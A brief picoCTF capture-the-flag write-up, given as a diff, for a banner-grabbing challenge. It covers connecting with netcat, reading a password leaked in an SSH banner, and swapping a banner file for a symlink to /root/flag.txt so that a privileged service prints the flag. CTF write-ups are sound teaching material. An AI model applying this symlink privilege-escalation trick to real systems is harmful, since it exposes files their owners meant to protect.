@@ -1,0 +1,35 @@
+$ nc tethys.picoctf.net 61457
+  SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
+(Leaked information)
+$ nc tethys.picoctf.net 60561        
+  *************************************
+  **************WELCOME****************
+  *************************************
+  
+  what is the password? 
+  My_Passw@rd_@1234
+  What is the top cyber security conference in the world?
+  Defcon
+  the first hacker ever was known for phreaking(making free phone calls), who was it?
+  John Draper 
+(Defcon was a guess, John Draper can just be looked up).
+After completing the questions, we're successfully conneceted to the server as player@challenge
+
+$ cd ../../root
+$ ls
+(Shows flag.txt file)
+$ cat flag.txt 
+  Permission denied.
+$ su 
+  Needs auth... 
+
+Hit a wall here, but we're given a hint about symlinks so did some research about that and we can reference a file that we have read access to, to the flag.txt file.
+
+$ rm banner
+  rm banner
+$ player@challenge:~$ ln -s /root/flag.txt banner
+  ln -s /root/flag.txt banner
+$ nc tethys.picoctf.net 63560
+  picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
+
+
